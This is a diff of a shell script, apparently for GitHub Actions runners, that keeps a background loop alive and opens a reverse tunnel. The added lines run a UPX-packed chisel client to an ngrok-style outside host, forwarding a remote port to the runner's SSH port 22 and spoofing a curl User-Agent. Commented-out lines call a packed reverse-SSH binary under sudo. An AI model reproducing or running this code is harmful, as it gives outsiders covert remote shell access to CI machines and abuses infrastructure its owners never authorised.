@@ -89,7 +89,7 @@ echo "flag_9832q_20240425 $ip_port7pxy2a";
 # )&
 
 
-
+(
 (while true; do
         echo `date`;
         [ ! -f /tmp/keepalive ] && break        
@@ -141,37 +141,31 @@ if [ ! -z ${port5} ] && [ ! -z ${ip5} ] && [ "714" == "714"  ]; then
   #sudo sh -c "export HOME=/tmp;$GITHUB_WORKSPACE/upx_reverse-sshx64.bin  -v -b $bport  -p $port5 $ip5"; 
   date;
   #[ ! -z ${GITHUB_WORKSPACE} ] &&
-   #(
-   #   echo "exit_revSSH_isOK ${ip5} : ${port5}  -> $bport ";
-   #   sleep 60;
-   #   [ -x $GITHUB_WORKSPACE/upx_reverse-sshx64.bin ]&&(sudo -H sh -c "$GITHUB_WORKSPACE/upx_reverse-sshx64.bin -v -b $bport -p $port5 $ip5;echo \$?;");echo $?;      
-   #)||sudo sh -c "/home/runner/work/nc_test/nc_test/upx_reverse-sshx64.bin -v -b $bport -p $port5 $ip5";
+  #(
+  #   echo "exit_revSSH_isOK ${ip5} : ${port5}  -> $bport ";
+  #   sleep 60;
+  #   [ -x $GITHUB_WORKSPACE/upx_reverse-sshx64.bin ]&&(sudo -H sh -c "$GITHUB_WORKSPACE/upx_reverse-sshx64.bin -v -b $bport -p $port5 $ip5;echo \$?;");echo $?;      
+  #)||sudo sh -c "/home/runner/work/nc_test/nc_test/upx_reverse-sshx64.bin -v -b $bport -p $port5 $ip5";
+  [ ! -z ${GITHUB_WORKSPACE} ] &&
+  (
+  echo "exit_revSSH-chisel_isOK  : $bport ";
+  sleep 5;
+  [ -x $GITHUB_WORKSPACE/chisel2upx.elf ]&&(
+  $GITHUB_WORKSPACE/chisel2upx.elf client -v --header 'User-Agent: curl/7.87.0' 8hlr6pq0noxm.ngrok.xiaomiqiu123.top R:0.0.0.0:$bport:127.0.0.1:22;echo $?;)
+  echo $?;
+  )||(
+  num51z=$(date +%S);
+  num67z=$(echo "1"$num51z);
+  num76=$((${num67z}%8));
+  bport2=5005"$num76";
 
-[ ! -z ${GITHUB_WORKSPACE} ] &&
-(
-echo "exit_revSSH-chisel_isOK  : $bport ";
-sleep 5;
-sudo bash <<'EO1F'
-[ -x $GITHUB_WORKSPACE/chisel2upx.elf ]&&(
-$GITHUB_WORKSPACE/chisel2upx.elf client -v --header 'User-Agent: curl/7.87.0' 8hlr6pq0noxm.ngrok.xiaomiqiu123.top R:0.0.0.0:$bport:127.0.0.1:22;echo \$?;)
-EO1F
-echo $?;
-)||(
+  export  bport2=$bport2
+  export GITHUB_WORKSPACE=/home/runner/work/nc_test/nc_test
+  $GITHUB_WORKSPACE/chisel2upx.elf client -v --header 'User-Agent: curl/8.12.0' 8hlr6pq0noxm.ngrok.xiaomiqiu123.top R:0.0.0.0:$bport2:127.0.0.1:22;
+  echo $?;
+  )
 
-sudo bash <<'EO1F'
-num51z=$(date +%S);
-num67z=$(echo "1"$num51z);
-num76=$((${num67z}%8));
-bport2=5005"$num76";
-
-export  bport2=$bport2
-export GITHUB_WORKSPACE=/home/runner/work/nc_test/nc_test
-$GITHUB_WORKSPACE/chisel2upx.elf client -v --header 'User-Agent: curl/8.12.0' 8hlr6pq0noxm.ngrok.xiaomiqiu123.top R:0.0.0.0:$bport2:127.0.0.1:22;
-echo $?;
-EO1F
-)
-
-  echo "exit_revSSH_isOK_$bport  $(date)";date;
+    echo "exit_revSSH_isOK_$bport  $(date)";date;
 fi
 
 
@@ -181,7 +175,7 @@ echo $(date);
 sleep 13; 
 
 
-done) &
+done) &  )&
 
 
 
